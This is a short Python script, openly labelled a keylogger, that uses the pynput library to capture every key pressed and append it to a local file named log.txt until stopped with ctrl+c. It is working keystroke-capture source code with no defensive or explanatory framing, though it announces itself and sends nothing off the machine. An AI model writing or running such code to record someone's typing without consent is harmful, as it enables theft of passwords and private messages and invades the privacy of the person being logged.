from pynput.keyboard import Listener

def log_keystrokes(key):
    key=str(key).replace("","")
    with open("log.txt", "a")as log_file:
        log_file.write(key+ "\n")

def start_logging():
    with Listener(on_press=log_keystrokes)as listener:
        listener.join()
if __name__ == "__main__":
    print("keylogger is running... press ctrl + c to stop")
    start_logging()